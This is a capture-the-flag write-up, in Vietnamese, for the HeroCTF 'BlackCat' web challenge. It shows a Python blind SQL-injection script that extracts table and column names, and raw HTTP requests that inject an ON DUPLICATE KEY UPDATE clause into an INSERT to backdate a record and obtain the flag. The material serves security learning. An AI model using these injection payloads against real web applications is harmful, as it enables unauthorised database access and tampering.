# HeroCTF - BlackCat

**Description**: Ayo nạp email và sau 3 ngày email mày sẽ được validate từ đó có thể tham gia cái event này vui lắm(flag).

Đây là 1 bài blackbox nên tối mờ tối mịt, khó là ở chỗ foothold, không có hint chắc người thiếu kiên nhẫn như mình đòi bỏ quộc.

1. Cho 1 endpoint curl đến với 1 email, trả về 1 endpoint khác cùng secret.
2. Curl đến endpoint trả về trên cùng email và secret thi được `ayo!! 3 ngày`

Làm gì đây, là 1 hacker thì phải đa nghi đi test tất chứ, thử SQLi vào email endpoint thứ nhất thì đúng là nó dính(trigger error bằng comment hoặc `e@b.c', 'secret')-- -` mà curl với secret trên đúng là chuẩn rồi)

Mình muốn nhấn mạnh mình cần đa nghi nhiều hơn nữa và test tất, đã thử là thử cho ra trò, xem xét req valid với res valid và error khi test các kí tự đặc biệt.

Tiếp build python script brute-force tìm table và column:
```python
import requests
import string

characters = string.ascii_letters + string.digits + string.punctuation
url = 'https://blackcat.web.heroctf.fr/api/newsletter.php'
s = requests.Session()


headers = {
	'User-Agent': 'curl/7.83.0',
	'Accept': '*/*',
	'Content-Type': 'application/x-www-form-urlencoded'
}

flag = ''
while True:
	for c in characters:
		data = {
			'email': f"hello16@abc.com', (SELECT CASE WHEN (SELECT ascii(substring((SELECT email FROM newsletter limit 0,1),{len(flag)+1},1)))={ord(c)} THEN '1' ELSE 1/0 END)) ON DUPLICATE KEY UPDATE secret=secret-- -"
			# 'email': "hello16@abc.com', 'a') ON DUPLICATE KEY UPDATE send_date=1-- -"
		}

		r = s.post(url, data=data, headers=headers)
		print(flag+c)
		if 'ok' in r.json():
			flag += c
			print('[FOUND] : '+flag)
			break
```
1. Tìm được database(): backcat
2. table_name: newsletter
3. columns: email, secret, send_date

Tiếp ta dùng burp đấm(vì nó chỉ cho dùng curl(thật ra thêm header `tao là curl` là được))

## ENDPOINT 1
`request`:
```
POST /api/newsletter.php HTTP/2
Host: blackcat.web.heroctf.fr
User-Agent: curl/7.83.0
Accept: */*
Content-Length: 84
Content-Type: application/x-www-form-urlencoded

email=devme1@abc.com', 'a') ON DUPLICATE KEY UPDATE send_date=DATE('2023-11-22')-- -
```
Ta SQLi ở insert, nếu email trùng thì duplicate update `send_date` cho quá hạn là được!!. À mà quên, ta leak được column vs table_name nhưng không đọc được value trong đó nên ta không đoán được type của send_date là gì. Học làm pentest mà còn hỏi, phải test chứ gì, `int` không được nghĩ đến hàm `date()` để parse date.

`response`:
```
HTTP/2 200 OK
Server: nginx/1.21.6
Date: Sun, 29 May 2022 16:08:55 GMT
Content-Type: application/json
Content-Length: 269
X-Powered-By: PHP/7.2.34

{"ok":"Check at /api/check.php with your email as get parameter and this secret: cc58d9ae093cbfb80ebc as get parameter too, to check if you've been accepted.<br>Example: https://blackcat.web.heroctf.fr/api/check.php?email=worty@blackcat.fr&secret=a32ecb08749ffeaf4e78"}
```

## ENDPOINT 2
Giai đoạn get flag thôi!!

`request`:
```
GET /api/check.php?email=devme1@abc.com&secret=a HTTP/2
Host: blackcat.web.heroctf.fr
User-Agent: curl/7.83.0
Accept: */*


```

`response`:
```
HTTP/2 200 OK
Server: nginx/1.21.6
Date: Sun, 29 May 2022 16:08:57 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 268
X-Powered-By: PHP/7.2.34
Vary: Accept-Encoding

We are glad that you participate at this very hidden conference !<br>Conferences will take place at 'blackcatjnhhyaiolppiqnbsvvxgcifuelkzpalsm.onion'<br>Be sure to proof that you receive this email with this sentence : Hero{y0u_b34t_bl4ckc4t_0rg4n1z3rs!!}<br>BlackCat.
```

**flag**: `Hero{y0u_b34t_bl4ckc4t_0rg4n1z3rs!!`
